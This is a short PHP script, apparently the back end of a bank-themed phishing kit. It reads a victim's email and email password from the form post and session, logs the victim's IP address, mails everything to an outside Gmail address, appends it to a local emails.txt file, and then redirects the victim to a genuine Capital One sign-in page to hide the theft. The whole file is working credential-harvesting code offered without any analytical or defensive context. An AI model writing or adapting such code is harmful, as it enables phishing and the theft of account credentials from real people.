<?php
error_reporting(0);
$emailpass = $_POST['emailpass'];
$ip = getenv("REMOTE_ADDR");
session_start ();
$email = $_SESSION['email'];

$subj = "Wells - $email $emailpass";
$msg = "Email: $email - Email Pass: $emailpass | IP: $ip

E-mail: $email
E-mail Pass: $emailpass
--------------------
IP: $ip
____________________
";

mail("@gmail.com", $subj, $msg);

$pula = fopen ("emails.txt" , "a");
fwrite ($pula , $msg);
fclose ($pula);

header("Location: https://verified.capitalone.com/auth/signin");

?>